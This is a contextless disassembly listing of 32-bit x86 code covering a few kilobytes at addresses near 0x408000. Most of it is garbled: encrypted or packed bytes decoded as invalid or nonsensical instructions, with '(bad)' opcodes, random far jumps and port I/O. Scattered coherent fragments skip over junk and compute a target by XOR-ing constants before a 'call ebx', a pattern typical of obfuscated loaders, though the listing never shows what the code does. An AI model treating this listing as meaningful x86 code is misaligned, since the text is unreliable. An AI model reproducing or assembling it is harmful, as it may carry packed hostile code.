  40837e:	adc    eax,0x39100a77
  408383:	and    esp,esi
  408385:	shr    BYTE PTR ds:0xe46424fb,1
  40838b:	inc    ebx
  40838c:	loope  0x4083b4
  40838e:	jo     0x408372
  408390:	jnp    0x4083a6
  408392:	xor    DWORD PTR [esi],esi
  408394:	test   cl,cl
  408396:	cld    
  408397:	mov    edi,DWORD PTR [ebp-0x212e633d]
  40839d:	push   ds
  40839e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40839f:	or     DWORD PTR [ebp-0x17d0c5d0],eax
  4083a5:	xchg   esp,eax
  4083a6:	cli    
  4083a7:	inc    eax
  4083a8:	mov    eax,ds:0xb0a71c99
  4083ad:	ins    DWORD PTR es:[edi],dx
  4083ae:	retf   0x564f
  4083b1:	xchg   esi,eax
  4083b2:	loope  0x4083d3
  4083b4:	mov    ebp,DWORD PTR [esi+ebp*1]
  4083b7:	aas    
  4083b8:	mov    al,0xbd
  4083ba:	dec    esp
  4083bb:	xchg   esp,ebp
  4083bd:	loope  0x40836a
  4083bf:	mov    bl,0x5d
  4083c1:	in     al,dx
  4083c2:	pop    edx
  4083c3:	sahf   
  4083c4:	push   esi
  4083c5:	pop    esi
  4083c6:	inc    esp
  4083c7:	cmp    al,bl
  4083c9:	enter  0x4c8,0xd8
  4083cd:	push   edx
  4083ce:	stos   DWORD PTR es:[edi],eax
  4083cf:	push   ebx
  4083d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083d1:	ret    0x351
  4083d4:	or     al,0xb0
  4083d6:	or     DWORD PTR [ecx+0x15],esi
  4083d9:	cmp    esp,DWORD PTR [eax+0x2d050c2d]
  4083df:	cmp    ch,bl
  4083e1:	push   edx
  4083e2:	mov    ch,0x6f
  4083e4:	mov    edx,0x12ba9ebb
  4083e9:	aad    0x28
  4083eb:	xor    eax,0xff8cf038
  4083f0:	cdq    
  4083f1:	imul   edx,DWORD PTR [edx-0x80],0x58
  4083f5:	mov    al,0x91
  4083f7:	mov    ecx,0x3b555c4
  4083fc:	call   0x9390:0x65828759
  408403:	sub    ebp,DWORD PTR [esi]
  408405:	shl    DWORD PTR ds:0xcaa6bf4f,1
  40840b:	retf   0x5c4c
  40840e:	adc    DWORD PTR [esi+eiz*8],edx
  408411:	push   eax
  408412:	adc    dh,bh
  408414:	sbb    ah,BYTE PTR [ebx]
  408416:	pop    ss
  408417:	std    
  408418:	push   cs
  408419:	(bad)  
  40841a:	(bad)  
  40841b:	call   0x3b44:0x3a9ddd52
  408422:	xor    BYTE PTR [edi+ecx*1+0x48baadec],cl
  408429:	mov    bl,0xb6
  40842b:	sub    eax,0x5de98700
  408430:	aam    0xb5
  408432:	jbe    0x4084ae
  408434:	push   esi
  408435:	mov    dl,0xf2
  408437:	dec    ecx
  408438:	test   al,0x42
  40843a:	adc    DWORD PTR [edx+0x20477834],0x1d1ea320
  408444:	out    0x3f,eax
  408446:	adc    al,0x4
  408448:	sbb    DWORD PTR [ebx+0x22],edx
  40844b:	test   al,0xd9
  40844d:	pushf  
  40844e:	cmp    al,BYTE PTR [ecx]
  408450:	mov    bh,0x19
  408452:	mov    ?,WORD PTR [ebp-0x4ec0d5e3]
  408458:	jmp    0x40840f
  40845a:	pop    edx
  40845b:	push   ss
  40845c:	sbb    DWORD PTR [ebx+edx*1+0x5ac541d8],esp
  408463:	mov    es,ebp
  408465:	std    
  408466:	mov    edx,DWORD PTR [bx-0x3b]
  40846a:	add    eax,0xbf2c1c1c
  40846f:	hlt    
  408470:	std    
  408471:	xor    eax,0x7b7601df
  408476:	jo     0x40840a
  408478:	push   ds
  408479:	in     al,dx
  40847a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40847b:	fdivr  DWORD PTR [ecx]
  40847d:	mov    edi,DWORD PTR [esi+0x33]
  408480:	shr    ecx,0x84
  408483:	add    DWORD PTR [eax],eax
  408485:	add    BYTE PTR [ebx],ch
  408487:	or     bl,bh
  408489:	je     0x408486
  40848b:	out    0xfb,eax
  40848d:	sub    ecx,DWORD PTR [ebp-0x30d3b375]
  408493:	jns    0x4084b6
  408495:	outs   dx,BYTE PTR ds:[esi]
  408496:	fistp  QWORD PTR [edi]
  408498:	jl     0x408516
  40849a:	call   0x2fbd011e
  40849f:	cli    
  4084a0:	lahf   
  4084a1:	push   0xff3b5adc
  4084a6:	dec    ebx
  4084a7:	loop   0x40844b
  4084a9:	cdq    
  4084aa:	fisub  DWORD PTR [ebp-0x61]
  4084ad:	sbb    DWORD PTR [ebx],edi
  4084af:	pusha  
  4084b0:	lods   eax,DWORD PTR ds:[esi]
  4084b1:	and    ah,BYTE PTR [edi]
  4084b3:	mov    bh,0xbf
  4084b5:	aaa    
  4084b6:	ja     0x40852c
  4084b8:	(bad)  
  4084ba:	jae    0x40850f
  4084bc:	xlat   BYTE PTR ds:[ebx]
  4084bd:	jg     0x408504
  4084bf:	pop    edi
  4084c0:	sbb    BYTE PTR [edi+ebp*1],dh
  4084c3:	inc    ebx
  4084c4:	cdq    
  4084c5:	shr    BYTE PTR [ebx+ecx*2],1
  4084c8:	inc    edx
  4084c9:	mov    al,0xf8
  4084cb:	cwde   
  4084cc:	scas   al,BYTE PTR es:[edi]
  4084cd:	jae    0x4084a3
  4084cf:	and    DWORD PTR [edi+0x2e],eax
  4084d2:	dec    ebp
  4084d3:	add    BYTE PTR [eax-0x12d0a8e2],al
  4084d9:	dec    ecx
  4084da:	faddp  st(5),st
  4084dc:	mov    bh,0x92
  4084de:	push   edx
  4084df:	sbb    BYTE PTR [ebx+esi*4-0x2a],ah
  4084e3:	in     al,0x7e
  4084e5:	adc    al,0x9
  4084e7:	fcom   st(3)
  4084e9:	jne    0x40849b
  4084eb:	into   
  4084ec:	cmc    
  4084ed:	push   cs
  4084ee:	sahf   
  4084ef:	sub    DWORD PTR [edx-0x4b],edi
  4084f2:	mov    gs,edx
  4084f4:	hlt    
  4084f5:	xor    al,0xb5
  4084f7:	pop    es
  4084f8:	xor    bh,bh
  4084fa:	mov    ebp,0xd0d748d0
  4084ff:	rcl    bl,cl
  408501:	pop    edx
  408502:	xchg   esp,eax
  408503:	aas    
  408504:	dec    edx
  408505:	add    ecx,edx
  408507:	mov    cl,BYTE PTR [ebx+0x12]
  40850a:	daa    
  40850b:	test   al,0x6a
  40850d:	aas    
  40850e:	inc    esp
  40850f:	in     al,0x1f
  408511:	mov    ah,0x56
  408513:	push   ds
  408514:	xor    ah,al
  408516:	imul   edx,DWORD PTR [ebp+0x669514bb],0xffffffc8
  40851d:	pushf  
  40851e:	xchg   ebp,eax
  40851f:	dec    esi
  408520:	xor    eax,0x8d90efb
  408525:	lods   al,BYTE PTR ds:[esi]
  408526:	inc    eax
  408527:	ins    BYTE PTR es:[edi],dx
  408528:	xchg   ebp,eax
  408529:	inc    edi
  40852a:	sub    edx,DWORD PTR [ecx+0x7b]
  40852d:	shl    edx,cl
  40852f:	or     DWORD PTR [esi+0x7abfc3b7],edx
  408535:	enter  0xc096,0xbe
  408539:	addr16 pop es
  40853b:	inc    edx
  40853c:	pushw  0x76
  40853f:	das    
  408540:	dec    ebx
  408541:	stos   DWORD PTR es:[edi],eax
  408542:	call   0xc230:0x3015
  408548:	sub    eax,0xcb8770db
  40854d:	jo     0x408520
  40854f:	fld    QWORD PTR [eax]
  408551:	or     cl,bl
  408553:	mov    bl,0x24
  408555:	pop    ecx
  408556:	retf   
  408557:	jbe    0x40856b
  408559:	sub    cl,BYTE PTR [ecx-0x50]
  40855c:	jne    0x40858c
  40855e:	push   ds
  40855f:	das    
  408560:	stc    
  408561:	dec    esi
  408562:	shr    BYTE PTR [esi+edx*8],0x5b
  408566:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408567:	jecxz  0x408528
  408569:	(bad)  
  40856a:	inc    edx
  40856b:	cmc    
  40856c:	pop    ecx
  40856d:	rcr    esp,0x48
  408570:	or     bl,BYTE PTR [esi-0x80]
  408573:	mov    ebp,0xd8a96c53
  408578:	xor    eax,0xaaa4fb8
  40857d:	inc    edx
  40857e:	inc    eax
  40857f:	pop    es
  408580:	fwait
  408581:	dec    ebx
  408582:	push   ds
  408583:	add    eax,DWORD PTR [eax-0x75def1d]
  408589:	sub    DWORD PTR [eax+edi*1-0x39235ec4],ecx
  408590:	stos   DWORD PTR es:[edi],eax
  408591:	arpl   WORD PTR [esi+eiz*2+0x2d73d2be],sp
  408598:	dec    ebx
  408599:	out    dx,al
  40859a:	aas    
  40859b:	stc    
  40859c:	sub    bh,BYTE PTR [eax+ebx*2+0x47]
  4085a0:	es pop ebp
  4085a2:	or     BYTE PTR [edx+0x7d04fa66],ah
  4085a8:	mov    edx,0xcb7cd580
  4085ad:	imul   esp,DWORD PTR [eax-0x383dd895],0x5a
  4085b4:	push   cs
  4085b5:	dec    ecx
  4085b6:	and    bh,ah
  4085b8:	cmp    edx,ecx
  4085ba:	jle    0x4085a4
  4085bc:	call   0x55b1:0xca1e454f
  4085c3:	pop    es
  4085c4:	into   
  4085c5:	or     eax,0x801883b3
  4085ca:	cmp    ebp,edi
  4085cc:	xor    bl,BYTE PTR [ecx+0xc]
  4085cf:	popa   
  4085d0:	xchg   esp,eax
  4085d1:	add    ecx,DWORD PTR [eax-0x1d]
  4085d4:	or     BYTE PTR [ecx-0x54377ba7],dl
  4085da:	inc    edi
  4085db:	ffreep st(3)
  4085dd:	xor    al,0x88
  4085df:	ja     0x4085b5
  4085e1:	xchg   ecx,eax
  4085e2:	adc    BYTE PTR [esi-0x60],dl
  4085e5:	jle    0x408586
  4085e7:	lock inc esi
  4085e9:	cmp    BYTE PTR [bx+0x335d],ah
  4085ee:	dec    ecx
  4085ef:	xor    BYTE PTR [ebp-0x59],dl
  4085f2:	sub    BYTE PTR [edx],ch
  4085f4:	pop    ss
  4085f5:	mov    ebp,0x909bf786
  4085fa:	add    BYTE PTR [ecx+0x33],dh
  4085fd:	mov    al,ds:0x1fbf9283
  408602:	dec    DWORD PTR [edx]
  408604:	add    eax,0xf26c1777
  408609:	stos   BYTE PTR es:[edi],al
  40860a:	add    eax,esi
  40860c:	imul   eax,DWORD PTR [edx]
  40860f:	mov    edx,DWORD PTR [ebp-0x4]
  408612:	xor    edx,ecx
  408614:	mov    ecx,DWORD PTR [ebp+0x8]
  408617:	lea    ecx,[edx+ecx*1+0x32729e]
  40861e:	cmp    ecx,eax
  408620:	jmp    0x4087a9
  408625:	test   DWORD PTR [edi],esp
  408627:	in     al,dx
  408628:	iret   
  408629:	jp     0x4085f2
  40862b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40862c:	jge    0x4085fc
  40862e:	(bad)  
  40862f:	loope  0x408624
  408631:	lock mov esp,0x3e4beca0
  408637:	jl     0x4086b5
  408639:	call   0x29bd02bd
  40863e:	push   ebp
  40863f:	mov    edx,0x84fbbc56
  408644:	xchg   ecx,eax
  408645:	mov    cl,0x9a
  408647:	sahf   
  408648:	inc    esp
  408649:	lock dec ebx
  40864b:	loop   0x408656
  40864d:	jmp    0x40862a
  40864f:	and    al,0x13
  408651:	outs   dx,BYTE PTR ds:[esi]
  408652:	or     eax,0x1724d94b
  408657:	xchg   edi,eax
  408658:	popa   
  408659:	out    0xb0,eax
  40865b:	inc    edi
  40865c:	clc    
  40865d:	adc    edi,DWORD PTR [ebp+0x6a8ba183]
  408663:	pop    ebx
  408664:	xor    ebx,eax
  408666:	xlat   BYTE PTR ds:[ebx]
  408667:	test   ch,bh
  408669:	jmp    DWORD PTR [eax+0x29]
  40866c:	in     eax,dx
  40866d:	dec    edi
  40866e:	jp     0x408684
  408670:	and    DWORD PTR [ebx+0x20],ecx
  408673:	ficom  WORD PTR [edx+0x2a08ca58]
  408679:	dec    edx
  40867a:	add    BYTE PTR [eax+esi*4],bh
  40867d:	in     al,dx
  40867e:	aam    0x73
  408680:	xor    DWORD PTR [edx+0x31dd2613],esp
  408686:	pop    esp
  408687:	or     DWORD PTR [ecx+0x4d],ecx
  40868a:	pop    es
  40868b:	lods   eax,DWORD PTR ds:[esi]
  40868c:	test   DWORD PTR [edi],edi
  40868e:	mov    ebx,0x29360f28
  408693:	jl     0x40867b
  408695:	add    eax,0x2e9b5b91
  40869a:	push   edx
  40869b:	aam    0xf9
  40869d:	xor    eax,0xed6a98ae
  4086a2:	das    
  4086a3:	push   0x9
  4086a5:	loop   0x408657
  4086a7:	aam    0x11
  4086a9:	dec    eax
  4086aa:	mov    BYTE PTR [esi+0x406671f5],dh
  4086b0:	lea    edi,[ebx+0xa3b6f9d]
  4086b6:	cmp    eax,0xd4710ee
  4086bb:	push   edi
  4086bc:	jo     0x408645
  4086be:	das    
  4086bf:	dec    edx
  4086c0:	adc    edi,DWORD PTR [edx-0x15]
  4086c3:	pop    eax
  4086c4:	es ret 0xe83e
  4086c8:	dec    esi
  4086c9:	pop    ebp
  4086ca:	inc    esi
  4086cb:	xlat   BYTE PTR ds:[ebx]
  4086cc:	fisub  WORD PTR [esi-0x75]
  4086cf:	mov    bh,0xb4
  4086d1:	stc    
  4086d2:	lock aam 0xd1
  4086d5:	lock outs dx,DWORD PTR ds:[esi]
  4086d7:	pop    ecx
  4086d8:	fisub  DWORD PTR [edx+ecx*2+0x7d]
  4086dc:	sbb    al,0xbf
  4086de:	jp     0x40872d
  4086e0:	cmp    BYTE PTR [ecx+ebp*4+0x117a3a54],0x7a
  4086e8:	push   ds
  4086e9:	cli    
  4086ea:	idiv   dl
  4086ec:	sub    al,0x83
  4086ee:	jns    0x408708
  4086f0:	push   edx
  4086f1:	cmp    al,BYTE PTR [bp+0x4]
  4086f5:	xor    ah,bh
  4086f7:	movq   mm6,QWORD PTR [ecx]
  4086fa:	push   edi
  4086fb:	push   esi
  4086fc:	pop    ecx
  4086fd:	mov    edi,0x694eaa71
  408702:	into   
  408703:	xchg   edx,eax
  408704:	arpl   WORD PTR [edi-0x16],bx
  408707:	sbb    eax,0xee3dd9e0
  40870c:	cs xchg ebx,eax
  40870e:	or     eax,0x987e7aaa
  408713:	push   0xffffffd1
  408715:	ror    BYTE PTR [edx-0x59639adf],0xd5
  40871c:	in     al,0xdc
  40871e:	jle    0x408738
  408720:	mov    al,0xb8
  408722:	mov    WORD PTR [ecx-0x49e9fc63],ds
  408728:	pop    es
  408729:	xor    DWORD PTR [edi],ecx
  40872b:	and    BYTE PTR [edx+edx*4-0x77],cl
  40872f:	jno    0x4086d2
  408731:	das    
  408732:	cmp    cl,0x5
  408735:	rcr    DWORD PTR [edi+0x71d2b76a],cl
  40873b:	or     DWORD PTR [ecx],edi
  40873d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40873e:	in     al,0x70
  408740:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408741:	fidivr WORD PTR gs:[ecx]
  408744:	sub    BYTE PTR [ebx],al
  408746:	or     al,0x8b
  408748:	(bad)  
  408749:	jg     0x40871a
  40874b:	mov    ecx,0xfd8c5ccc
  408750:	hlt    
  408751:	or     eax,0xde52d6c0
  408756:	xor    eax,0x4095588c
  40875b:	mov    eax,0xb84826b8
  408760:	sbb    ebx,ecx
  408762:	sub    BYTE PTR [edx-0x37],0xfd
  408766:	out    dx,al
  408767:	es mov ebx,0x9eeefefb
  40876d:	inc    ecx
  40876e:	mov    BYTE PTR [ebx-0x56],dl
  408771:	imul   ebx,edi,0x39
  408774:	push   ebp
  408775:	add    DWORD PTR [eax],esi
  408777:	stos   BYTE PTR es:[edi],al
  408778:	jb     0x408732
  40877a:	mov    dl,0x0
  40877c:	pop    ebp
  40877d:	adc    ebp,esi
  40877f:	retf   0xffcd
  408782:	dec    edi
  408783:	pop    ebx
  408784:	scas   eax,DWORD PTR es:[edi]
  408785:	mov    eax,0xf4c971b3
  40878a:	cdq    
  40878b:	push   edx
  40878c:	pop    ebp
  40878d:	sub    DWORD PTR [ebx-0x52],edx
  408790:	inc    ecx
  408791:	pushf  
  408792:	push   eax
  408793:	pop    esp
  408794:	arpl   si,di
  408796:	sub    edi,esi
  408798:	iret   
  408799:	test   DWORD PTR [esi+0xfeb2f66],ebp
  40879f:	push   ds
  4087a0:	test   DWORD PTR [eax],ebp
  4087a2:	aaa    
  4087a3:	mov    ds:0x7b40a106,al
  4087a8:	ja     0x4087b9
  4087aa:	test   ecx,ebp
  4087ac:	idiv   edi
  4087ae:	dec    DWORD PTR [ebx+0x5e9de]
  4087b4:	add    BYTE PTR [eax],al
  4087b6:	mov    ebx,0x32729e
  4087bb:	mov    eax,DWORD PTR [ebp-0x4]
  4087be:	xor    eax,0x7510857
  4087c3:	add    eax,ebx
  4087c5:	mov    DWORD PTR [ebp-0xc],eax
  4087c8:	xor    ebx,ebx
  4087ca:	lea    eax,[ebp-0x10]
  4087cd:	add    ebx,DWORD PTR [eax]
  4087cf:	call   ebx
  4087d1:	xor    ebx,ebx
  4087d3:	inc    ebx
  4087d4:	cmp    DWORD PTR [ebp+0x10],ebx
  4087d7:	je     0x40897e
  4087dd:	xchg   edx,eax
  4087de:	push   0xa
  4087e0:	pop    ecx
  4087e1:	push   0x4
  4087e3:	pop    ebx
  4087e4:	inc    ebx
  4087e5:	xchg   ebx,ecx
  4087e7:	sub    ebx,ecx
  4087e9:	xchg   ebx,ecx
  4087eb:	dec    ecx
  4087ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4087ef:	jmp    0x408978
  4087f4:	hlt    
  4087f5:	jecxz  0x4087ee
  4087f7:	dec    esi
  4087f8:	jnp    0x408874
  4087fa:	pop    ecx
  4087fb:	std    
  4087fc:	sahf   
  4087fd:	retf   0x4846
  408800:	and    al,0x87
  408802:	and    edx,ebx
  408804:	daa    
  408805:	xor    BYTE PTR [esp+edi*2-0x18],bh
  408809:	jg     0x408887
  40880b:	jl     0x408867
  40880d:	dec    BYTE PTR [ebp+0x5c15e842]
  408813:	push   ebx
  408814:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408815:	jae    0x4087f7
  408817:	mov    eax,ds:0xf77b4d9d
  40881c:	and    DWORD PTR [edi-0x71d64613],edx
  408822:	jno    0x40887a
  408824:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408825:	dec    ecx
  408826:	test   eax,0xa677a1f5
  40882b:	adc    BYTE PTR [esi+0x2d7bf3c7],bh
  408831:	cwde   
  408832:	jo     0x408876
  408834:	xchg   edi,eax
  408835:	pusha  
  408836:	icebp  
  408837:	adc    al,0xe1
  408839:	pop    ebp
  40883a:	mov    ebp,0xbd12bccb
  40883f:	cmc    
  408840:	sub    eax,0x63709e99
  408845:	and    bl,BYTE PTR [esi+0x6c7e7584]
  40884b:	jl     0x4088ad
  40884d:	test   al,0x23
  40884f:	adc    al,0x95
  408851:	mov    bh,0x76
  408853:	rcr    al,0x49
  408856:	jmp    DWORD PTR [edx+ebp*2-0x2e18ef1b]
  40885d:	aam    0x42
  40885f:	int    0xde
  408861:	mov    ds:0x15e5e60b,eax
  408866:	in     al,0xa
  408868:	ins    BYTE PTR es:[edi],dx
  408869:	and    BYTE PTR ss:[edi-0x54],dh
  40886d:	mov    ah,0x35
  40886f:	mov    ah,bl
  408871:	push   ss
  408872:	dec    esi
  408873:	ins    BYTE PTR es:[edi],dx
  408874:	add    eax,0x26397ebc
  408879:	push   edi
  40887a:	aad    0xd0
  40887c:	pop    eax
  40887d:	test   ecx,esi
  40887f:	xchg   ebx,eax
  408880:	or     DWORD PTR [edi],eax
  408882:	sar    BYTE PTR es:[edi+0x4f],cl
  408886:	sbb    al,0x53
  408888:	popf   
  408889:	sub    DWORD PTR [edi-0x2c],edi
  40888c:	pop    ebx
  40888d:	mov    esi,0xe6e27b38
  408892:	outs   dx,DWORD PTR ds:[esi]
  408893:	inc    eax
  408894:	sysenter 
  408896:	adc    BYTE PTR [ecx+0x4564899f],0xad
  40889d:	ins    BYTE PTR es:[edi],dx
  40889e:	jmp    0xad90:0x63057627
  4088a5:	fsubr  QWORD PTR [esi]
  4088a7:	add    BYTE PTR [edx-0x6ca0ecf8],0xbf
  4088ae:	jno    0x40889e
  4088b0:	sub    dl,BYTE PTR [ecx-0xa]
  4088b3:	pop    ds
  4088b4:	mov    DWORD PTR [ecx+eax*2+0x3652b02b],edi
  4088bb:	aaa    
  4088bc:	test   al,0x9e
  4088be:	imul   esi,DWORD PTR [ecx-0x21],0xffffffc7
  4088c2:	into   
  4088c3:	stos   DWORD PTR es:[edi],eax
  4088c4:	jmp    0xfe6b:0x313c9a08
  4088cb:	and    eax,0xba2b0dcf
  4088d0:	gs es fwait
  4088d3:	sbb    eax,0x1e459cac
  4088d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088d9:	das    
  4088da:	adc    BYTE PTR [ebp-0x22],ch
  4088dd:	jne    0x4088cc
  4088df:	jmp    0xcd51:0x2d5b3c43
  4088e6:	xchg   edi,eax
  4088e7:	mov    ds:0xa68b42d2,al
  4088ec:	mov    esp,0x79c78524
  4088f1:	pop    es
  4088f2:	out    0xe5,eax
  4088f4:	xor    BYTE PTR [eax],al
  4088f6:	xchg   esi,eax
  4088f7:	rsm    
  4088f9:	push   0xffffffd1
  4088fb:	inc    esi
  4088fc:	jg     0x40893b
  4088fe:	jmp    0x6667:0x6e7b644
  408905:	sbb    cl,BYTE PTR [edx+0x63d36210]
  40890b:	mov    al,ds:0x3b5d0a14
  408910:	in     al,dx
  408911:	dec    ecx
  408912:	loope  0x4088b7
  408914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408915:	stc    
  408916:	pop    esp
  408917:	inc    esi
  408918:	out    dx,eax
  408919:	mov    dl,0xb3
  40891b:	aad    0xc6
  40891d:	stos   DWORD PTR es:[edi],eax
  40891e:	cs xchg edi,eax
  408920:	jmp    0x4088e2
  408922:	mov    ?,WORD PTR [edi-0x67]
  408925:	out    dx,eax
  408926:	add    BYTE PTR [edx-0x3118ff2e],ch
  40892c:	aam    0x83
  40892e:	fsub   QWORD PTR [esi]
  408930:	cli    
  408931:	inc    ecx
  408932:	in     al,0x5f
  408934:	ret    
  408935:	xchg   ecx,eax
  408936:	xchg   edx,eax
  408937:	js     0x40890f
  408939:	mov    bh,0x26
  40893b:	aad    0x40
  40893d:	imul   ecx,DWORD PTR [ebx+ecx*2-0x6c335b69],0xab31577
  408948:	sbb    ch,cl
  40894a:	mov    al,BYTE PTR [ecx-0x1cc307a6]
  408950:	data16 jb 0x4089d0
  408953:	add    bh,BYTE PTR ds:0x50121230
  408959:	aaa    
  40895a:	call   0x96bb7379
  40895f:	and    BYTE PTR [esi+0x74cf0c25],cl
  408965:	add    BYTE PTR [edi],ah
  408967:	js     0x408947
  408969:	popf   
  40896a:	mov    ah,0x39
  40896c:	sub    BYTE PTR [ebx+0x3b],al
  40896f:	push   cs
  408970:	xchg   DWORD PTR [ebp+0x658df910],ecx
  408976:	rcr    BYTE PTR [ecx+0x3c1af0f],0xe0
  40897d:	xchg   edx,eax
  40897e:	push   eax
  40897f:	xor    ebx,ebx
  408981:	mov    edx,esp
  408983:	dec    edx
  408984:	jmp    0x408b0d
  408989:	xchg   BYTE PTR [edx+0x456bbe5f],ah
  40898f:	mov    ecx,0xfaf08d7a
  408994:	mov    esi,0x6f5f448e
  408999:	xchg   ebx,eax
  40899a:	xor    edi,DWORD PTR [esp+edi*2-0x18]
  40899e:	jg     0x408a1c
  4089a0:	jl     0x408956
  4089a2:	aad    0x28
  4089a4:	bound  eax,QWORD PTR [edi-0x57]
  4089a7:	mov    ebx,DWORD PTR [eax-0x5f]
  4089aa:	cs mov edx,0x5aba9eeb
  4089b0:	mov    eax,0x6f3e5e48
  4089b5:	sbb    al,0xc4
  4089b7:	jl     0x408939
  4089b9:	es jne 0x408a18
  4089bc:	jno    0x408a1c
  4089be:	repnz call 0x3bd3:0x7748392f
  4089c6:	jl     0x4089e0
  4089c8:	xchg   DWORD PTR [ecx],edx
  4089ca:	retf   0xb394
  4089cd:	sub    edx,DWORD PTR [edi+0x78877814]
  4089d3:	cwde   
  4089d4:	jmp    0xa63d:0xd0e2d5b5
  4089db:	jge    0x408a40
  4089dd:	bts    DWORD PTR [ecx-0x764599e9],ebp
  4089e4:	fdivp  st(6),st
  4089e6:	loope  0x408994
  4089e8:	mov    ebx,0x65c797a8
  4089ed:	mov    edi,0x7cf079ab
  4089f2:	mov    ds:0x92a7360e,eax
  4089f7:	adc    esp,DWORD PTR [ecx]
  4089f9:	out    0xde,eax
  4089fb:	test   al,0xdd
  4089fd:	shl    BYTE PTR [ecx],0x8b
  408a00:	sbb    ch,BYTE PTR [eax+0x9]
  408a03:	mov    WORD PTR [ebx],?
  408a05:	mov    ebp,edx
  408a07:	xchg   ebx,eax
  408a08:	pushf  
  408a09:	xchg   dl,bl
  408a0b:	pop    eax
  408a0c:	add    al,0x60
  408a0e:	sbb    edx,DWORD PTR [esp+ebp*2-0x34fca610]
  408a15:	outs   dx,BYTE PTR ds:[esi]
  408a16:	and    dh,BYTE PTR [esi+0x297b2691]
  408a1c:	cmp    bl,bl
  408a1e:	xchg   esi,eax
  408a1f:	xchg   esp,eax
  408a20:	pop    ebx
  408a21:	aad    0x4e
  408a23:	popa   
  408a24:	jbe    0x408a46
  408a26:	cmp    al,0xb3
  408a28:	xchg   ecx,eax
  408a29:	js     0x408a12
  408a2b:	push   0xe1287c43
  408a30:	fiadd  WORD PTR [ecx+0xd5d5fe3]
  408a36:	loopne 0x408a09
  408a38:	inc    ebp
  408a39:	aam    0xb0
  408a3b:	cmp    edi,ebx
  408a3d:	mov    ds:0x51fe881e,ax
  408a43:	ins    DWORD PTR es:[edi],dx
  408a44:	test   DWORD PTR [ecx+0x4],edi
  408a47:	cld    
  408a48:	jmp    0x31aed9c2
  408a4d:	jge    0x408a3e
  408a4f:	ins    DWORD PTR es:[edi],dx
  408a50:	cmp    bh,bl
  408a52:	sbb    al,0xa7
  408a54:	mov    eax,ebp
  408a56:	jl     0x408ac9
  408a58:	mov    ds:0x3922df61,al
  408a5d:	fadd   QWORD PTR [ecx-0x1e07c787]
  408a63:	adc    eax,0x40b2adb
  408a68:	jmp    0xb34082e
  408a6d:	sub    cl,BYTE PTR [ebx-0x78]
  408a70:	jmp    0xcb17:0xda293759
  408a77:	lods   eax,DWORD PTR ds:[esi]
  408a78:	mov    bl,0xcb
  408a7a:	adc    dh,BYTE PTR [edi+0x29]
  408a7d:	fndisi(8087 only) 
  408a7f:	jae    0x408ad6
  408a81:	in     al,dx
  408a82:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  408a84:	cmp    esi,eax
  408a86:	sub    DWORD PTR [ecx+0x625b89ef],esi
  408a8c:	data16 outs dx,BYTE PTR ds:[esi]
  408a8e:	inc    esp
  408a8f:	pop    edx
  408a90:	pushf  
  408a91:	sbb    BYTE PTR [edx+0x666e8e0f],ch
  408a97:	xchg   ebp,eax
  408a98:	jp     0x408ada
  408a9a:	adc    ecx,edi
  408a9c:	xchg   edi,eax
  408a9d:	stos   DWORD PTR es:[edi],eax
  408a9e:	mov    esp,0x3b77c922
  408aa3:	jmp    0xfaa6:0x5e5c5f60
  408aaa:	cli    
  408aab:	and    BYTE PTR [esi+0x71],bh
  408aae:	mov    cl,0xd4
  408ab0:	mov    ebx,0xfd5497b
  408ab5:	cwde   
  408ab6:	xor    DWORD PTR [ebp+0x36],eax
  408ab9:	cmp    eax,ebp
  408abb:	lds    ecx,FWORD PTR [eax-0x70ed94a7]
  408ac1:	jmp    0xdc53:0x8e426d01
  408ac8:	ds mov al,0x5a
  408acb:	(bad)  
  408acc:	out    0xfb,eax
  408ace:	cmp    al,0xb0
  408ad0:	inc    ebp
  408ad1:	or     BYTE PTR [ebp+0x2c16d5dc],dh
  408ad7:	push   ecx
  408ad8:	fcom   DWORD PTR [edx]
  408ada:	xor    al,0xfe
  408adc:	cmp    al,0x13
  408ade:	xor    eax,ebx
  408ae0:	(bad)  
  408ae1:	xor    al,0x9b
  408ae3:	xor    ah,dl
  408ae5:	xchg   DWORD PTR [edx+0x25a38c1f],edx
  408aeb:	mov    al,ds:0x371b3d3f
  408af0:	push   edx
  408af1:	daa    
  408af2:	adc    ch,BYTE PTR [ecx-0x57]
  408af5:	rcl    DWORD PTR [edx+0x5d],0xed
  408af9:	out    0x2c,eax
  408afb:	stc    
  408afc:	inc    esi
  408afd:	hlt    
  408afe:	sar    eax,1
  408b00:	or     DWORD PTR [ebp+0x15],ebp
  408b03:	test   DWORD PTR [esi+0x3a],0x80a9d701
  408b0a:	add    eax,0x343efbd
  408b0f:	sbb    al,0x1a
  408b11:	dec    ebx
  408b12:	xor    edx,edx
  408b14:	add    DWORD PTR [ebp-0xc],ebx
  408b17:	pop    ebx
  408b18:	mov    eax,DWORD PTR [ebp-0xc]
  408b1b:	pop    edi
  408b1c:	jmp    0x408ca5
  408b21:	add    al,0xa8
  408b23:	retf   
  408b24:	mov    al,0x7b
  408b26:	push   ebx
  408b27:	xchg   DWORD PTR [eax-0x17],edi
  408b2a:	shl    ebx,1
  408b2c:	das    
  408b2d:	mov    dh,0xe1
  408b2f:	fild   DWORD PTR [esi+0x7c7c350f]
  408b35:	call   0x9cbd07b9
  408b3a:	in     al,dx
  408b3b:	(bad)  
  408b3c:	rcr    BYTE PTR [edi-0x6b8805f6],0xa8
  408b43:	push   edi
  408b44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b45:	mov    ebp,esp
  408b47:	dec    BYTE PTR [si-0x4376]
  408b4c:	mov    eax,0xf54d9a66
  408b51:	mov    bh,0x9e
  408b53:	les    eax,FWORD PTR [eax-0x57cf508f]
  408b59:	daa    
  408b5a:	out    0xfc,eax
  408b5c:	jae    0x408b33
  408b5e:	(bad)  
  408b5f:	int    0x51
